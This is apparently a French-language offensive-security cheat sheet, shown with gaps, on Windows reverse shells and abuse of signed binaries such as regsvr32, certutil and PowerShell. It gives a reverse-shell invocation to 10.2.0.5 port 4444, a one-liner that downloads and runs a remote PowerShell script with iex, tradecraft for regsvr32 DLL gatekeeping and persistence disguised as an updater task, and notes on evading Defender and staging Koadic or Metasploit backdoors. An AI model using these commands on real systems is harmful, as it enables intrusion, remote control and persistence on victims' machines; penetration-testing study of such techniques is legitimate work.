...
La page [lolbas-project.github.io](https://lolbas-project.github.io/) est destinée à Windows, tout comme [https://gtfobins.github.io/](https://gtfobins.github.io/) est destinée à Linux.<sup>[[13]](#references)[[14]](#references)</sup>
Windows utilise des access tokens et des privileges pour la sécurité des processus, et Windows 11 inclut également une commande `sudo` facultative.<sup>[[11]](#references)[[12]](#references)</sup> Il est utile de savoir **comment** certains **binaries** peuvent être (ab)usés pour effectuer des actions inattendues, comme **exécuter du code arbitraire**.<sup>[[13]](#references)</sup>

Les payloads de reverse-shell Windows de base rassemblés ci-dessous sont également documentés dans les cheat sheets de HighOn.Coffee et de PayloadsAllTheThings ; adaptez les chemins et les interpréteurs installés à la cible.<sup>[[1]](#references)[[4]](#references)</sup>
...
En plus de charger des scriptlets distants (`scrobj.dll`), `regsvr32.exe` charge une DLL locale et invoque ses exports `DllRegisterServer`/`DllUnregisterServer`. Les custom loaders abusent fréquemment de ce mécanisme pour exécuter du code arbitraire tout en se fondant dans un LOLBin signé. Deux tradecraft notes observées dans la nature :<sup>[[6]](#references)</sup>

- Argument de gatekeeping : la DLL se termine sauf si un switch spécifique est passé via `/i:<arg>`, par exemple `/i:--type=renderer` pour imiter les processus enfants renderer de Chromium. Cela réduit les exécutions accidentelles et complique le travail des sandboxes.
- Persistence : planifier l’exécution de `regsvr32` pour lancer la DLL en mode silencieux, avec des privilèges élevés et l’argument `/i` requis, en se faisant passer pour une tâche d’updater :
```powershell
...
Voir également : la variante ClickFix clipboard-to-PowerShell qui met en place un JS loader, puis assure sa persistence avec `regsvr32`.<sup>[[6]](#references)</sup>
{{#ref}}
...
```
**Vous pouvez très facilement télécharger et exécuter un zombie Koadic à l’aide du stager regsvr**.<sup>[[3]](#references)</sup>

## Certutil

- [Depuis ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

Télécharger une B64dll, la décoder et l’exécuter.<sup>[[5]](#references)</sup>
```bash
...
```
Processus effectuant l'appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **WebDAV client local cache**.<sup>[[5]](#references)</sup>
```bash
...
Dans le dossier **Shells**, il y a de nombreux Shells différents. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier :<sup>[[19]](#references)</sup>
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Commencez à servir le script sur un serveur web et exécutez-le du côté de la victime :<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender ne le détecte pas comme du code malveillant (pour l’instant, 03/04/2019).
...
Créez un launcher PowerShell, enregistrez-le dans un fichier, puis téléchargez-le et exécutez-le.<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
```
...
Créez une version PowerShell de la backdoor de metasploit à l’aide de unicorn.<sup>[[24]](#references)</sup>
```
...
- [1] [Aide-mémoire des reverse shells : PHP, ASP, Netcat, Bash et Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
...
- [4] [Aide-mémoire des reverse shells - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [Oneliners Windows pour télécharger une payload distante et exécuter du code arbitraire](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
- [6] [Check Point Research – Under the Pure Curtain : de RAT à Builder puis Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [7] [calc.hta – exemple d'exécution reverse HTA (gist d'Arno0x)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
...
- [11] [Jetons d'accès – applications Win32 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
...
- [23] [Empire (dépôt archivé)](https://github.com/EmpireProject/Empire)
